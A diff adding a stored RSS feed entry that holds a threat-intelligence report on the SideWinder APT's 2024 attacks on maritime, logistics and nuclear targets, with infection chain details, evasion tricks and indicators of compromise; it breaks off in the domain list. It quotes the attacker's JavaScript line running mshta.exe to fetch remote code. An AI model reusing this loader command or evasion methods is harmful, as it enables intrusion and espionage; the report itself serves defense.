@@ -1554,6 +1554,733 @@
                 }
             ],
             "media_keywords": "thumbnail"
+        },
+        {
+            "title": "SideWinder targets the maritime and nuclear sectors with an updated toolset",
+            "title_detail": {
+                "type": "text/plain",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "SideWinder targets the maritime and nuclear sectors with an updated toolset"
+            },
+            "links": [
+                {
+                    "rel": "alternate",
+                    "type": "text/html",
+                    "href": "https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/"
+                }
+            ],
+            "link": "https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/",
+            "comments": "https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/#respond",
+            "authors": [
+                {
+                    "name": "Giampaolo Dedola, Vasily Berdnikov"
+                }
+            ],
+            "author": "Giampaolo Dedola, Vasily Berdnikov",
+            "author_detail": {
+                "name": "Giampaolo Dedola, Vasily Berdnikov"
+            },
+            "published": "Mon, 10 Mar 2025 10:00:36 +0000",
+            "published_parsed": [
+                2025,
+                3,
+                10,
+                10,
+                0,
+                36,
+                0,
+                69,
+                0
+            ],
+            "tags": [
+                {
+                    "term": "APT reports",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": ".NET",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "APT",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Defense evasion",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "HTA",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "JavaScript",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Technologies",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "shellcode",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "SideWinder",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Spear phishing",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Targeted attacks",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "APT (Targeted attacks)",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Windows malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "full",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "large",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "medium",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "thumbnail",
+                    "scheme": null,
+                    "label": null
+                }
+            ],
+            "id": "https://kasperskycontenthub.com/securelist/?p=115847",
+            "guidislink": false,
+            "summary": "In this article, we discuss the tools and TTPs used in the SideWinder APT's attacks in H2 2024, as well as shifts in its targets, such as an increase in attacks against the maritime and logistics sectors.",
+            "summary_detail": {
+                "type": "text/html",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "In this article, we discuss the tools and TTPs used in the SideWinder APT's attacks in H2 2024, as well as shifts in its targets, such as an increase in attacks against the maritime and logistics sectors."
+            },
+            "content": [
+                {
+                    "type": "text/html",
+                    "language": null,
+                    "base": "https://securelist.com/feed/",
+                    "value": "<p><img alt=\"\" class=\"attachment-securelist-huge-promo size-securelist-huge-promo wp-post-image\" height=\"400\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10080620/sidewinder-maritime-featured-990x400.jpg\" width=\"990\" /></p><p>Last year, we published <a href=\"https://securelist.com/sidewinder-apt/114089/\" rel=\"noopener\" target=\"_blank\">an article about SideWinder</a>, a highly prolific APT group whose primary targets have been military and government entities in Pakistan, Sri Lanka, China, and Nepal. In it, we described activities that had mostly happened in the first half of the year. We tried to draw attention to the group, which was aggressively extending its activities beyond their typical targets, infecting government entities, logistics companies and maritime infrastructures in South and Southeast Asia, the Middle East, and Africa. We also shared further information about SideWinder&#8217;s post-exploitation activities and described a new sophisticated implant designed specifically for espionage.</p>\n<p>We continued to monitor the group throughout the rest of the year, observing intense activity that included updates to SideWinder&#8217;s toolset and the creation of a massive new infrastructure to spread malware and control compromised systems. The targeted sectors were consistent with those we had seen in the first part of 2024, but we noticed a new and significant increase in attacks against maritime infrastructures and logistics companies.</p>\n<p>In 2024, we initially observed a significant number of attacks in Djibouti. Subsequently, the attackers shifted their focus to other entities in Asia and showed a strong interest in targets within Egypt.</p>\n<p>Moreover, we observed other attacks that indicated a specific interest in nuclear power plants and nuclear energy in South Asia and further expansion of activities into new countries, especially in Africa.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115868\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1.png\"><img alt=\"Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024\" class=\"size-large wp-image-115868\" height=\"635\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1-1024x635.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115868\">Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024</p></div>\n<p>It is worth noting that SideWinder constantly works to improve its toolsets, stay ahead of security software detections, extend persistence on compromised networks, and hide its presence on infected systems. Based on our observation of the group&#8217;s activities, we presume they are constantly monitoring detections of their toolset by security solutions. Once their tools are identified, they respond by generating a new and modified version of the malware, often in under five hours. If behavioral detections occur, SideWinder tries to change the techniques used to maintain persistence and load components. Additionally, they change the names and paths of their malicious files. Thus, monitoring and detection of the group&#8217;s activities reminds us of a ping-pong game.</p>\n<h2 id=\"infection-vectors\">Infection vectors</h2>\n<p>The infection pattern observed in the second part of 2024 is consistent with the one described in the previous article.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115854\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02.png\"><img alt=\"Infection flow\" class=\"size-large wp-image-115854\" height=\"581\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02-1024x581.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115854\">Infection flow</p></div>\n<p>The attacker sends spear-phishing emails with a DOCX file attached. The document uses the remote template injection technique to download an RTF file stored on a remote server controlled by the attacker. The file exploits a known vulnerability (<a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2017-11882\" rel=\"noopener\" target=\"_blank\">CVE-2017-11882</a>) to run a malicious shellcode and initiate a multi-level infection process that leads to the installation of malware we have named &#8220;Backdoor Loader&#8221;. This acts as a loader for &#8220;StealerBot&#8221;, a private post-exploitation toolkit used exclusively by SideWinder.</p>\n<p>The documents used various themes to deceive victims into believing they are legitimate.</p>\n<p>Some documents concerned nuclear power plants and nuclear energy agencies.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115855\" style=\"width: 764px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07151758/SideWinder_03.png\"><img alt=\"Malicious documents related to nuclear power plants and energy\" class=\"size-full wp-image-115855\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07151758/SideWinder_03.png\" width=\"754\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115855\">Malicious documents related to nuclear power plants and energy</p></div>\n<p>Many others concerned maritime infrastructures and various port authorities.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115856\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07152635/SideWinder_04.png\"><img alt=\"Malicious documents relating to maritime infrastructures and different port authorities\" class=\"size-large wp-image-115856\" height=\"533\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07152635/SideWinder_04-1024x533.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115856\">Malicious documents relating to maritime infrastructures and different port authorities</p></div>\n<p>In general, the detected documents predominantly concerned governmental decisions or diplomatic issues. Most of the attacks were aimed at various national ministries and diplomatic entities.</p>\n<p>We also detected various documents that covered generic topics. For example, we found a document with information on renting a car in Bulgaria, a document expressing an intent to buy a garage, and another document offering a freelance video game developer a job working on a 3D action-adventure game called &#8220;Galactic Odyssey&#8221;.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115857\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05.png\"><img alt=\"Examples of generic malicious documents\" class=\"size-large wp-image-115857\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05-1024x284.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115857\">Examples of generic malicious documents</p></div>\n<h2 id=\"rtf-exploit\">RTF exploit</h2>\n<p>The exploit file contained a shellcode, which had been updated by the attacker since our previous research, but the main goal remained the same: to run embedded JavaScript code invoking the <pre class=\"crayon-plain-tag\">mshtml.RunHTMLApplication</pre> function.</p>\n<p>In the new version, the embedded JavaScript runs the Windows utility <pre class=\"crayon-plain-tag\">mshta.exe</pre> and obtains additional code from a remote server:</p><pre class=\"crayon-plain-tag\">javascript:eval(\"var gShZVnyR = new ActiveXObject('WScript.Shell');gShZVnyR.Run('mshta.exe\nhttps://dgtk.depo-govpk[.]com/19263687/trui',0);window.close();\")</pre><p>\nThe newer version of the shellcode still uses certain tricks to avoid sandboxes and complicate analysis, although they differ slightly from those in past versions.</p>\n<ul>\n<li>It uses the <pre class=\"crayon-plain-tag\">GlobalMemoryStatusEx</pre> function to determine the size of RAM.</li>\n<li>It attempts to load the <pre class=\"crayon-plain-tag\">nlssorting.dll</pre> library and terminates execution if operation succeeds.</li>\n</ul>\n<h2 id=\"javascript-loader\">JavaScript loader</h2>\n<p>The RTF exploit led to the execution of the <pre class=\"crayon-plain-tag\">mshta.exe</pre> Windows utility, abused to download a malicious HTA from a remote server controlled by the attacker.</p><pre class=\"crayon-plain-tag\">mshta.exe hxxps://dgtk.depo-govpk[.]com/19263687/trui</pre><p>\nThe remote HTA embeds a heavily obfuscated JavaScript file that loads further malware, the &#8220;Downloader Module&#8221;, into memory.</p>\n<p>The JavaScript loader operates in two stages. The first stage begins execution by loading various strings, initially encoded with a substitution algorithm and stored as variables. It then checks the installed RAM and terminates if the total size is less than 950 MB. Otherwise, the previously decoded strings are used to load the second stage.</p>\n<p>The second stage is another JavaScript file. It enumerates the subfolders at Windows%\\Microsoft.NET\\Framework\\ to find the version of the .NET framework installed on the system and uses the resulting value to configure the environment variable <pre class=\"crayon-plain-tag\">COMPLUS_Version</pre>.</p>\n<p>Finally, the second stage decodes and loads the Downloader Module, which is embedded within its code as a base64-encoded .NET serialized stream.</p>\n<h2 id=\"downloader-module\">Downloader Module</h2>\n<p>This component is a .NET library used to collect information about the installed security solution and download another component, the &#8220;Module Installer&#8221;. These components were already described in the <a href=\"https://securelist.com/sidewinder-apt/114089/\" rel=\"noopener\" target=\"_blank\">previous article</a> and will not be detailed again here.</p>\n<p>In our latest investigation, we discovered a new version of the <pre class=\"crayon-plain-tag\">app.dll</pre> Downloader Module, which includes a more sophisticated function for identifying installed security solutions.</p>\n<p>In the previous version, the malware used a simple WMI query to obtain a list of installed products. The new version uses a different WMI, which collects the name of the antivirus and the related &#8220;productState&#8221;.</p>\n<p>Furthermore, the malware compares all running process names against an embedded dictionary. The dictionary contains 137 unique process names associated with popular security solutions.<br />\nThe WMI query is executed only when no Kaspersky processes are running on the system.</p>\n<h2 id=\"backdoor-loader\">Backdoor Loader</h2>\n<p>The infection chain concludes with the installation of malware that we have named &#8220;Backdoor Loader&#8221;, a library consistently sideloaded using a legitimate and signed application. Its primary function is to load the &#8220;StealerBot&#8221; implant into memory. Both the &#8220;Backdoor Loader&#8221; and &#8220;StealerBot&#8221; were thoroughly described in our prior article, but the attacker has distributed numerous variants of the loader in recent months, whereas the implant has remained unchanged.</p>\n<p>In the previous campaign, the &#8220;Backdoor Loader&#8221; library was designed to be loaded by two specific programs. For correct execution, it had to be stored on victims&#8217; systems under one of the following names:</p><pre class=\"crayon-plain-tag\">propsys.dll\nvsstrace.dll</pre><p>\nDuring the most recent campaign, the attackers tried to diversify the samples, generating many other variants distributed under the following names:</p><pre class=\"crayon-plain-tag\">JetCfg.dll\npolicymanager.dll\nwinmm.dll\nxmllite.dll\ndcntel.dll\nUxTheme.dll</pre><p>\nThe new malware variants feature an enhanced version of anti-analysis code and employ Control Flow Flattening more extensively to evade detection.</p>\n<p>During the investigation, we found a new C++ version of the &#8220;Backdoor Loader&#8221; component. The malware logic is the same as that used in the .NET variants, but the C++ version differs from the .NET implants in that it lacks anti-analysis techniques. Furthermore, most of the samples were tailored to specific targets, as they were configured to load the second stage from a specific file path embedded in the code, which also included the user&#8217;s name. Example:</p><pre class=\"crayon-plain-tag\">C:\\Users\\[REDACTED]\\AppData\\Roaming\\valgrind\\[REDACTED FILE NAME].[REDACTED EXTENSION]</pre><p>\nIt indicates that these variants were likely used after the infection phase and manually deployed by the attacker within the already compromised infrastructure, after validating the victim.</p>\n<h2 id=\"victims\">Victims</h2>\n<p>SideWinder continues to attack its usual targets, especially government, military, and diplomatic entities. The targeted sectors are consistent with those observed in the past, but it is worth mentioning that the number of attacks against the maritime and the logistics sectors has increased and expanded to Southeast Asia.</p>\n<p>Furthermore, we observed attacks against entities associated with nuclear energy. The following industries were also affected: telecommunication, consulting, IT service companies, real estate agencies, and hotels.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115869\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2.png\"><img alt=\"Countries and territories targeted by SideWinder in 2024\" class=\"size-large wp-image-115869\" height=\"961\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2-1024x961.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115869\">Countries and territories targeted by SideWinder in 2024</p></div>\n<p>Overall, the group has further extended its activities, especially in Africa. We detected attacks in Austria, Bangladesh, Cambodia, Djibouti, Egypt, Indonesia, Mozambique, Myanmar, Nepal, Pakistan, Philippines, Sri Lanka, the United Arab Emirates, and Vietnam.</p>\n<p>In this latest wave of attacks, SideWinder also targeted diplomatic entities in Afghanistan, Algeria, Bulgaria, China, India, the Maldives, Rwanda, Saudi Arabia, Turkey, and Uganda.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>SideWinder is a very active and persistent actor that is constantly evolving and improving its toolkits. Its basic infection method is the use of an old Microsoft Office vulnerability, <a href=\"https://www.kaspersky.com/blog/cve-2017-11882-exploitation-on-the-rise/48768/\" rel=\"noopener\" target=\"_blank\">CVE-2017-11882</a>, which once again emphasizes the critical importance of installing security patches.</p>\n<p>Despite the use of an old exploit, we should not underestimate this threat actor. In fact, SideWinder has already demonstrated its ability to compromise critical assets and high-profile entities, including those in the military and government. We know the group&#8217;s software development capabilities, which became evident when we observed how quickly they could deliver updated versions of their tools to evade detection, often within hours. Furthermore, we know that their toolset also includes advanced malware, like the sophisticated in-memory implant &#8220;StealerBot&#8221; described in our previous article. These capabilities make them a highly advanced and dangerous adversary.</p>\n<p>To protect against such attacks, we strongly recommend maintaining a patch management process to apply security fixes (you can use solutions like <a href=\"https://www.kaspersky.com/small-to-medium-business-security/systems-management?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___ksysm____49792969949dc2ac\" rel=\"noopener\" target=\"_blank\">Vulnerability Assessment and Patch Management</a> and <a href=\"https://www.kaspersky.com/vuln-feed?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______371398534a23cb78\" rel=\"noopener\" target=\"_blank\">Kaspersky Vulnerability Data Feed</a>) and using a comprehensive security solution that provides incident detection and response, as well as threat hunting. <a href=\"https://www.kaspersky.com/enterprise-security/xdr?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___xdr____33801aaaec3e63b3\" rel=\"noopener\" target=\"_blank\">Our product line for businesses</a> helps identify and prevent attacks of any complexity at an early stage. The campaign described in this article relies on spear-phishing emails as the initial attack vector, which highlights the importance of <a href=\"https://www.kaspersky.com/small-to-medium-business-security/security-awareness-platform?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___kasap____ffbd8ff4936461b3\" rel=\"noopener\" target=\"_blank\">regular employee training and awareness programs</a> for corporate security.</p>\n<p>We will continue to monitor the activity of this group and to update heuristic and behavioral rules for effective detection of malware.</p>\n<p><em>***More information, IoCs and YARA rules for SideWinder are available to customers of the <a href=\"https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______061e6d9a729b12ec\" rel=\"noopener\" target=\"_blank\">Kaspersky Intelligence Reporting Service</a>. Contact: <a href=\"mailto:intelreports@kaspersky.com\" rel=\"noopener\" target=\"_blank\">intelreports@kaspersky.com</a>.</em></p>\n<h2 id=\"indicators-of-compromise\">Indicators of compromise</h2>\n<h3 id=\"microsoft-office-documents\">Microsoft Office Documents</h3>\n<p><a href=\"https://opentip.kaspersky.com/e9726519487ba9e4e5589a8a5ec2f933/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______1928e6984a72217d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">e9726519487ba9e4e5589a8a5ec2f933</a><br />\n<a href=\"https://opentip.kaspersky.com/d36a67468d01c4cb789cd6794fb8bc70/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______5cb15d681de426b2&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">d36a67468d01c4cb789cd6794fb8bc70</a><br />\n<a href=\"https://opentip.kaspersky.com/313f9bbe6dac3edc09fe9ac081950673/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______bf9c98068caca24d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">313f9bbe6dac3edc09fe9ac081950673</a><br />\n<a href=\"https://opentip.kaspersky.com/bd8043127abe3f5cfa61bd2174f54c60/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______afbce9df289ba0f3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">bd8043127abe3f5cfa61bd2174f54c60</a><br />\n<a href=\"https://opentip.kaspersky.com/e0bce049c71bc81afe172cd30be4d2b7/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______10fdee92775b0f23&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">e0bce049c71bc81afe172cd30be4d2b7</a><br />\n<a href=\"https://opentip.kaspersky.com/872c2ddf6467b1220ee83dca0e118214/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______8f94f54999e481ef&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">872c2ddf6467b1220ee83dca0e118214</a><br />\n<a href=\"https://opentip.kaspersky.com/3d9961991e7ae6ad2bae09c475a1bce8/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______69968842085d4db4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">3d9961991e7ae6ad2bae09c475a1bce8</a><br />\n<a href=\"https://opentip.kaspersky.com/a694ccdb82b061c26c35f612d68ed1c2/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______8abc1a1e665334d4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">a694ccdb82b061c26c35f612d68ed1c2</a><br />\n<a href=\"https://opentip.kaspersky.com/f42ba43f7328cbc9ce85b2482809ff1c/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______e248acf5791f48d4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">f42ba43f7328cbc9ce85b2482809ff1c</a></p>\n<h3 id=\"backdoor-loader\">Backdoor Loader</h3>\n<p><a href=\"https://opentip.kaspersky.com/0216ffc6fb679bdf4ea6ee7051213c1e/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______0a9d6a1d6932475d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">0216ffc6fb679bdf4ea6ee7051213c1e</a><br />\n<a href=\"https://opentip.kaspersky.com/433480f7d8642076a8b3793948da5efe/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______3e7a2d5799dcdea7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">433480f7d8642076a8b3793948da5efe</a></p>\n<h3 id=\"domains-and-ips\">Domains and IPs</h3>\n<p><a href=\"https://opentip.kaspersky.com/pmd-office.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______9772f38592331619&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">pmd-office[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/modpak.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______50914ae51d0c9cb1&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">modpak[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/dirctt888.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______3347df4aa4aadc53&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dirctt888[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/modpak-info.services/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______893279f5785bad33&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">modpak-info[.]services</a><br />\n<a href=\"https://opentip.kaspersky.com/pmd-offc.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______1542b58c3817b249&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">pmd-offc[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/dowmloade.org/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______9b5d37dafdc36b0a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dowmloade[.]org</a><br />\n<a href=\"https://opentip.kaspersky.com/dirctt888.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______c35b5db4b20c3344&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dirctt888[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/portdedjibouti.live/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______039146381f69521d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">portdedjibouti[.]live</a><br />\n<a href=\"https://opentip.kaspersky.com/mods.email/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______fa708d7c4a3c1d85&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">mods[.]email</a><br />\n<a href=\"https://opentip.kaspersky.com/dowmload.co/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______b7a2106a18107dc5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dowmload[.]co</a><br />\n<a href=\"https://opentip.kaspersky.com/downl0ad.org/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______77e19ad01dad2173&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">downl0ad[.]org</a><br />\n<a href=\"https://opentip.kaspersky.com/d0wnlaod.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______9b8951b9ab05919d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">d0wnlaod[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/d0wnlaod.org/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______92fad3dfe73f10c4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">d0wnlaod[.]org</a><br />\n<a href=\"https://opentip.kaspersky.com/dirctt88.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______1402e355d5bf0395&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dirctt88[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/directt88.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______3295846a19135746&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">directt88[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/file-dwnld.org/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______23eaeedccb17f7fe&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">file-dwnld[.]org</a><br />\n<a href=\"https://opentip.kaspersky.com/defencearmy.pro/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______263d4c2a97e5f6e8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">defencearmy[.]pro</a><br />\n<a href=\"https://opentip.kaspersky.com/document-viewer.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______191eb093b6caa860&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">document-viewer[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/aliyum.email/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______3383f1d4b0e65d10&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">aliyum[.]email</a><br />\n<a href=\"https://opentip.kaspersky.com/d0cumentview.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______d3b5033a8ffaa5a1&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">d0cumentview[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/debcon.live/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______d3d9ab2ffbb5e275&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">debcon[.]live</a><br />\n<a href=\"https://opentip.kaspersky.com/document-viewer.live/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______f9a803c158d5227b&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">document-viewer[.]live</a><br />\n<a href=\"https://opentip.kaspersky.com/documentviewer.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______f59db153217f8dfc&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">documentviewer[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/ms-office.app/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______6d8b03226dd7e556&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">ms-office[.]app</a><br />\n<a href=\"https://opentip.kaspersky.com/ms-office.pro/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______9191f1b5a2d9ce7d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">ms-office[.]pro</a><br />\n<a href=\"https://opentip.kaspersky.com/pncert.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______bf26ec3a924faa3a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">pncert[.]info</a><br />\n<a 